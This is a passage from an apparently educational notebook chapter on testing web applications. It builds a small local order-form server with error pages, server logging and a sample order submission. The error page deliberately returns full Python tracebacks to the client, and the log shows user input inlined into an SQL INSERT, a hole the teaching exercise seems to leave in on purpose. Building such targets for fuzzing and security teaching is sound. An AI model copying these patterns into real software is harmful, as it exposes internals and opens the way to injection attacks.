        <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="error-handling">
<h4>Error Handling<a class="headerlink" href="#error-handling" title="Link to this heading">#</a></h4>
<p>We have defined pages for submitting and processing orders; now we also need a few pages for errors that might occur.</p>
<section id="page-not-found">
<h5>Page Not Found<a class="headerlink" href="#page-not-found" title="Link to this heading">#</a></h5>
<p>This page is displayed if a non-existing page (i.e. anything except <code class="docutils literal notranslate"><span class="pre">/</span></code> or <code class="docutils literal notranslate"><span class="pre">/order</span></code>) is requested.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTML_NOT_FOUND</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">&lt;html&gt;&lt;body&gt;</span>
<span class="s2">&lt;div style=&quot;border:3px; border-style:solid; border-color:#FF0000; padding: 1em;&quot;&gt;</span>
<span class="s2">  &lt;strong id=&quot;title&quot; style=&quot;font-size: x-large&quot;&gt;Sorry.&lt;/strong&gt;</span>
<span class="s2">  &lt;p&gt;</span>
<span class="s2">  This page does not exist.  Try our &lt;a href=&quot;/&quot;&gt;order form&lt;/a&gt; instead.</span>
<span class="s2">  &lt;/p&gt;</span>
<span class="s2">&lt;/div&gt;</span>
<span class="s2">&lt;/body&gt;&lt;/html&gt;</span>
<span class="s2">  &quot;&quot;&quot;</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTML</span><span class="p">(</span><span class="n">HTML_NOT_FOUND</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html">
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Sorry.</strong>
  <p>
  This page does not exist.  Try our <a href="/">order form</a> instead.
  </p>
</div>
</body></html>
  </div></div>
</div>
<p>The method <code class="docutils literal notranslate"><span class="pre">not_found()</span></code> takes care of sending this out with the appropriate HTTP status code.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">SimpleHTTPRequestHandler</span><span class="p">(</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">not_found</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="n">HTTPStatus</span><span class="o">.</span><span class="n">NOT_FOUND</span><span class="p">,</span> <span class="s2">&quot;Not found&quot;</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s2">&quot;Content-type&quot;</span><span class="p">,</span> <span class="s2">&quot;text/html&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>

        <span class="n">message</span> <span class="o">=</span> <span class="n">HTML_NOT_FOUND</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">message</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf8&quot;</span><span class="p">))</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="internal-errors">
<h5>Internal Errors<a class="headerlink" href="#internal-errors" title="Link to this heading">#</a></h5>
<p>This page is shown for any internal errors that might occur.  For diagnostic purposes, we have it include the traceback of the failing function.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTML_INTERNAL_SERVER_ERROR</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">&lt;html&gt;&lt;body&gt;</span>
<span class="s2">&lt;div style=&quot;border:3px; border-style:solid; border-color:#FF0000; padding: 1em;&quot;&gt;</span>
<span class="s2">  &lt;strong id=&quot;title&quot; style=&quot;font-size: x-large&quot;&gt;Internal Server Error&lt;/strong&gt;</span>
<span class="s2">  &lt;p&gt;</span>
<span class="s2">  The server has encountered an internal error.  Go to our &lt;a href=&quot;/&quot;&gt;order form&lt;/a&gt;.</span>
<span class="s2">  &lt;pre&gt;</span><span class="si">{error_message}</span><span class="s2">&lt;/pre&gt;</span>
<span class="s2">  &lt;/p&gt;</span>
<span class="s2">&lt;/div&gt;</span>
<span class="s2">&lt;/body&gt;&lt;/html&gt;</span>
<span class="s2">  &quot;&quot;&quot;</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTML</span><span class="p">(</span><span class="n">HTML_INTERNAL_SERVER_ERROR</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html">
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Internal Server Error</strong>
  <p>
  The server has encountered an internal error.  Go to our <a href="/">order form</a>.
  <pre>{error_message}</pre>
  </p>
</div>
</body></html>
  </div></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">traceback</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">SimpleHTTPRequestHandler</span><span class="p">(</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">internal_server_error</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="n">HTTPStatus</span><span class="o">.</span><span class="n">INTERNAL_SERVER_ERROR</span><span class="p">,</span> <span class="s2">&quot;Internal Error&quot;</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s2">&quot;Content-type&quot;</span><span class="p">,</span> <span class="s2">&quot;text/html&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>

        <span class="n">exc</span> <span class="o">=</span> <span class="n">traceback</span><span class="o">.</span><span class="n">format_exc</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">log_message</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">exc</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>

        <span class="n">message</span> <span class="o">=</span> <span class="n">HTML_INTERNAL_SERVER_ERROR</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">error_message</span><span class="o">=</span><span class="n">exc</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">message</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf8&quot;</span><span class="p">))</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="logging">
<h4>Logging<a class="headerlink" href="#logging" title="Link to this heading">#</a></h4>
<p>Our server runs as a separate process in the background, waiting to receive commands at all time.  To see what it is doing, we implement a special logging mechanism.  The <code class="docutils literal notranslate"><span class="pre">httpd_message_queue</span></code> establishes a queue into which one process (the server) can store Python objects, and in which another process (the notebook) can retrieve them.  We use this to pass log messages from the server, which we can then display in the notebook.</p>
<p>For multiprocessing, we use the <code class="docutils literal notranslate"><span class="pre">multiprocess</span></code> module - a variant of the standard Python <code class="docutils literal notranslate"><span class="pre">multiprocessing</span></code> module that also works in notebooks. If you are running this code outside a notebook, you can also use <code class="docutils literal notranslate"><span class="pre">multiprocessing</span></code> instead.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">multiprocess</span><span class="w"> </span><span class="kn">import</span> <span class="n">Queue</span>  <span class="c1"># type: ignore</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTTPD_MESSAGE_QUEUE</span> <span class="o">=</span> <span class="n">Queue</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
<p>Let us place two messages in the queue:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTTPD_MESSAGE_QUEUE</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="s2">&quot;I am another message&quot;</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTTPD_MESSAGE_QUEUE</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="s2">&quot;I am one more message&quot;</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
<p>To distinguish server messages from other parts of the notebook, we format them specially:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">bookutils</span><span class="w"> </span><span class="kn">import</span> <span class="n">rich_output</span><span class="p">,</span> <span class="n">terminal_escape</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">def</span><span class="w"> </span><span class="nf">display_httpd_message</span><span class="p">(</span><span class="n">message</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">rich_output</span><span class="p">():</span>
        <span class="n">display</span><span class="p">(</span>
            <span class="n">HTML</span><span class="p">(</span>
                <span class="s1">&#39;&lt;pre style=&quot;background: NavajoWhite;&quot;&gt;&#39;</span> <span class="o">+</span>
                <span class="n">message</span> <span class="o">+</span>
                <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">))</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">terminal_escape</span><span class="p">(</span><span class="n">message</span><span class="p">))</span>
</pre></div>
</div>
</div>
</div>
<div class="cell tag_remove-input docutils container">
<div class="cell_output docutils container">
<div class="output text_html"><pre style="background: NavajoWhite;">I am a httpd server message</pre></div></div>
</div>
<p>The method <code class="docutils literal notranslate"><span class="pre">print_httpd_messages()</span></code> prints all messages accumulated in the queue so far:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">def</span><span class="w"> </span><span class="nf">print_httpd_messages</span><span class="p">():</span>
    <span class="k">while</span> <span class="ow">not</span> <span class="n">HTTPD_MESSAGE_QUEUE</span><span class="o">.</span><span class="n">empty</span><span class="p">():</span>
        <span class="n">message</span> <span class="o">=</span> <span class="n">HTTPD_MESSAGE_QUEUE</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
        <span class="n">display_httpd_message</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">print_httpd_messages</span><span class="p">()</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><pre style="background: NavajoWhite;">I am another message</pre></div><div class="output text_html"><pre style="background: NavajoWhite;">I am one more message</pre></div></div>
</div>
<p>With <code class="docutils literal notranslate"><span class="pre">clear_httpd_messages()</span></code>, we can silently discard all pending messages:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">def</span><span class="w"> </span><span class="nf">clear_httpd_messages</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
    <span class="k">while</span> <span class="ow">not</span> <span class="n">HTTPD_MESSAGE_QUEUE</span><span class="o">.</span><span class="n">empty</span><span class="p">():</span>
        <span class="n">HTTPD_MESSAGE_QUEUE</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
<p>The method <code class="docutils literal notranslate"><span class="pre">log_message()</span></code> in the request handler makes use of the queue to store its messages:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">SimpleHTTPRequestHandler</span><span class="p">(</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">log_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="nb">format</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
        <span class="n">message</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;</span><span class="si">%s</span><span class="s2"> - - [</span><span class="si">%s</span><span class="s2">] </span><span class="si">%s</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">%</span>
                   <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">address_string</span><span class="p">(),</span>
                    <span class="bp">self</span><span class="o">.</span><span class="n">log_date_time_string</span><span class="p">(),</span>
                    <span class="nb">format</span> <span class="o">%</span> <span class="n">args</span><span class="p">))</span>
        <span class="n">HTTPD_MESSAGE_QUEUE</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
<p>In <a class="reference internal" href="Carver.html"><span class="std std-doc">the chapter on carving</span></a>, we had introduced a <code class="docutils literal notranslate"><span class="pre">webbrowser()</span></code> method which retrieves the contents of the given URL.  We now extend it such that it also prints out any log messages produced by the server:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">def</span><span class="w"> </span><span class="nf">webbrowser</span><span class="p">(</span><span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">mute</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Download and return the http/https resource given by the URL&quot;&quot;&quot;</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="n">contents</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">mute</span><span class="p">:</span>
            <span class="n">print_httpd_messages</span><span class="p">()</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">clear_httpd_messages</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">contents</span>
</pre></div>
</div>
</div>
</div>
<p>With <code class="docutils literal notranslate"><span class="pre">webbrowser()</span></code>, we are now ready to get the Web server up and running.</p>
</section>
</section>
<section id="end-of-excursion">
<h3>End of Excursion<a class="headerlink" href="#end-of-excursion" title="Link to this heading">#</a></h3>
</section>
<section id="running-the-server">
<h3>Running the Server<a class="headerlink" href="#running-the-server" title="Link to this heading">#</a></h3>
<p>We run the server on the <em>local host</em> – that is, the same machine which also runs this notebook.  We check for an accessible port and put the resulting URL in the queue created earlier.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">def</span><span class="w"> </span><span class="nf">run_httpd_forever</span><span class="p">(</span><span class="n">handler_class</span><span class="p">:</span> <span class="nb">type</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">NoReturn</span><span class="p">:</span>  <span class="c1"># type: ignore</span>
    <span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span>  <span class="c1"># localhost IP</span>
    <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8800</span><span class="p">,</span> <span class="mi">9000</span><span class="p">):</span>
        <span class="n">httpd_address</span> <span class="o">=</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="n">httpd</span> <span class="o">=</span> <span class="n">HTTPServer</span><span class="p">(</span><span class="n">httpd_address</span><span class="p">,</span> <span class="n">handler_class</span><span class="p">)</span>
            <span class="k">break</span>
        <span class="k">except</span> <span class="ne">OSError</span><span class="p">:</span>
            <span class="k">continue</span>

    <span class="n">httpd_url</span> <span class="o">=</span> <span class="s2">&quot;http://&quot;</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="s2">&quot;:&quot;</span> <span class="o">+</span> <span class="nb">repr</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
    <span class="n">HTTPD_MESSAGE_QUEUE</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">)</span>
    <span class="n">httpd</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
<p>The function <code class="docutils literal notranslate"><span class="pre">start_httpd()</span></code> starts the server in a separate process, which we start using the <code class="docutils literal notranslate"><span class="pre">multiprocess</span></code> module.  It retrieves its URL from the message queue and returns it, such that we can start talking to the server.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">multiprocess</span><span class="w"> </span><span class="kn">import</span> <span class="n">Process</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">def</span><span class="w"> </span><span class="nf">start_httpd</span><span class="p">(</span><span class="n">handler_class</span><span class="p">:</span> <span class="nb">type</span> <span class="o">=</span> <span class="n">SimpleHTTPRequestHandler</span><span class="p">)</span> \
        <span class="o">-&gt;</span> <span class="n">Tuple</span><span class="p">[</span><span class="n">Process</span><span class="p">,</span> <span class="nb">str</span><span class="p">]:</span>
    <span class="n">clear_httpd_messages</span><span class="p">()</span>

    <span class="n">httpd_process</span> <span class="o">=</span> <span class="n">Process</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">run_httpd_forever</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">handler_class</span><span class="p">,))</span>
    <span class="n">httpd_process</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>

    <span class="n">httpd_url</span> <span class="o">=</span> <span class="n">HTTPD_MESSAGE_QUEUE</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">httpd_process</span><span class="p">,</span> <span class="n">httpd_url</span>
</pre></div>
</div>
</div>
</div>
<p>Let us now start the server and save its URL:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">httpd_process</span><span class="p">,</span> <span class="n">httpd_url</span> <span class="o">=</span> <span class="n">start_httpd</span><span class="p">()</span>
<span class="n">httpd_url</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&#39;http://127.0.0.1:8800&#39;
</pre></div>
</div>
</div>
</div>
</section>
<section id="interacting-with-the-server">
<h3>Interacting with the Server<a class="headerlink" href="#interacting-with-the-server" title="Link to this heading">#</a></h3>
<p>Let us now access the server just created.</p>
<section id="direct-browser-access">
<h4>Direct Browser Access<a class="headerlink" href="#direct-browser-access" title="Link to this heading">#</a></h4>
<p>If you are running the Jupyter notebook server on the local host as well, you can now access the server directly at the given URL.  Simply open the address in <code class="docutils literal notranslate"><span class="pre">httpd_url</span></code> by clicking on the link below.</p>
<p><strong>Note</strong>: This only works if you are running the Jupyter notebook server on the local host.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">def</span><span class="w"> </span><span class="nf">print_url</span><span class="p">(</span><span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">rich_output</span><span class="p">():</span>
        <span class="n">display</span><span class="p">(</span><span class="n">HTML</span><span class="p">(</span><span class="s1">&#39;&lt;pre&gt;&lt;a href=&quot;</span><span class="si">%s</span><span class="s1">&quot;&gt;</span><span class="si">%s</span><span class="s1">&lt;/a&gt;&lt;/pre&gt;&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">url</span><span class="p">)))</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">terminal_escape</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">print_url</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><pre><a href="http://127.0.0.1:8800">http://127.0.0.1:8800</a></pre></div></div>
</div>
<p>Even more convenient, you may be able to interact directly with the server using the window below.</p>
<p><strong>Note</strong>: This only works if you are running the Jupyter notebook server on the local host.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">IPython.display</span><span class="w"> </span><span class="kn">import</span> <span class="n">IFrame</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">IFrame</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">,</span> <span class="s1">&#39;100%&#39;</span><span class="p">,</span> <span class="mi">230</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html">
        <iframe
            width="100%"
            height="230"
            src="http://127.0.0.1:8800"
            frameborder="0"
            allowfullscreen
            
        ></iframe>
        </div></div>
</div>
<p>After interaction, you can retrieve the messages produced by the server:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">print_httpd_messages</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
<p>We can also see any orders placed in the <code class="docutils literal notranslate"><span class="pre">orders</span></code> database (<code class="docutils literal notranslate"><span class="pre">db</span></code>):</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM orders&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">())</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[]
</pre></div>
</div>
</div>
</div>
<p>And we can clear the order database:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;DELETE FROM orders&quot;</span><span class="p">)</span>
<span class="n">db</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="retrieving-the-home-page">
<h4>Retrieving the Home Page<a class="headerlink" href="#retrieving-the-home-page" title="Link to this heading">#</a></h4>
<p>Even if our browser cannot directly interact with the server, the <em>notebook</em> can.  We can, for instance, retrieve the contents of the home page and display them:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">contents</span> <span class="o">=</span> <span class="n">webbrowser</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:14] "GET / HTTP/1.1" 200 -
</pre></div></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTML</span><span class="p">(</span><span class="n">contents</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html">
<html><body>
<form action="/order" style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Fuzzingbook Swag Order Form</strong>
  <p>
  Yes! Please send me at your earliest convenience
  <select name="item">
  <option value="tshirt">One FuzzingBook T-Shirt</option>
<option value="drill">One FuzzingBook Rotary Hammer</option>
<option value="lockset">One FuzzingBook Lock Set</option>

  </select>
  <br>
  <table>
  <tr><td>
  <label for="name">Name: </label><input type="text" name="name">
  </td><td>
  <label for="email">Email: </label><input type="email" name="email"><br>
  </td></tr>
  <tr><td>
  <label for="city">City: </label><input type="text" name="city">
  </td><td>
  <label for="zip">ZIP Code: </label><input type="number" name="zip">
  </tr></tr>
  </table>
  <input type="checkbox" name="terms"><label for="terms">I have read
  the <a href="/terms">terms and conditions</a></label>.<br>
  <input type="submit" name="submit" value="Place order">
</p>
</form>
</body></html>
</div></div>
</div>
</section>
<section id="placing-orders">
<h4>Placing Orders<a class="headerlink" href="#placing-orders" title="Link to this heading">#</a></h4>
<p>To test this form, we can generate URLs with orders and have the server process them.</p>
<p>The method <code class="docutils literal notranslate"><span class="pre">urljoin()</span></code> puts together a base URL (i.e., the URL of our server) and a path – say, the path towards our order.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">urljoin</span><span class="p">,</span> <span class="n">urlsplit</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">urljoin</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">,</span> <span class="s2">&quot;/order?foo=bar&quot;</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&#39;http://127.0.0.1:8800/order?foo=bar&#39;
</pre></div>
</div>
</div>
</div>
<p>With <code class="docutils literal notranslate"><span class="pre">urljoin()</span></code>, we can create a full URL that is the same as the one generated by the browser as we submit the order form.  Sending this URL to the browser effectively places the order, as we can see in the server log produced:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">contents</span> <span class="o">=</span> <span class="n">webbrowser</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">,</span>
                              <span class="s2">&quot;/order?item=tshirt&amp;name=Jane+Doe&amp;email=doe</span><span class="si">%40e</span><span class="s2">xample.com&amp;city=Seattle&amp;zip=98104&quot;</span><span class="p">))</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:14] INSERT INTO orders VALUES ('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104')
</pre></div><div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:14] "GET /order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104 HTTP/1.1" 200 -
</pre></div></div>
</div>
<p>The web page returned confirms the order:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTML</span><span class="p">(</span><span class="n">contents</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html">
<html><body>
